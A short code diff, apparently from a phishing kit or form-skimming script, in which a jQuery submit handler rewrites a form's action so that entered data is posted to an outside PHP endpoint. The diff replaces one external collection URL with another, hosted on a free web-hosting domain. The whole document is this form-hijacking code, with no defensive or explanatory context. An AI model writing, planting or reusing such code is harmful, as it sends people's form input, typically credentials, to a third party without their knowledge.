@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://dedekkarambiacuans.my.id/super/cocok1.php");
+  $(myform).attr("action", "https://korul8721387.000webhostapp.com/input.php");
 });
